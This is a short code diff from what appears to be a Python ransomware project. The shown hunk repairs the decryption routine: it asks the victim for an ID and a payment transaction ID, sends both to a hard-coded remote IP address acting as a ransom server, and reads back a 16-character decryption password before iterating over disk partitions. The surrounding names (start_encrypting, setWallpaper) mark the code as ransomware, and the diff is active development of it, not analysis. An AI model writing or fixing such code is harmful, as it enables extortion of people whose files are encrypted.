@@ -95,12 +95,12 @@ def start_encrypting():
   setWallpaper(id)
 
 def start_decrypting():
-  id=raw_input("Enter your Unique ID : ")
+  vid=raw_input("Enter your Unique ID : ")
   tid  = raw_input("Enter your Transaction id : ")
-  response = urllib.urlopen("http://139.59.8.120?action=dec&id="+id+"&tid="+tid)
+  password = urllib.urlopen("http://139.59.8.120?action=dec&id="+vid+"&tid="+tid).read()
   
-  if len(response.read()) == 16:
-    password=response.read()
+  if len(password) == 16:
+    print password
     drives=[]
     all_drives=psutil.disk_partitions()
     for drive in all_drives:
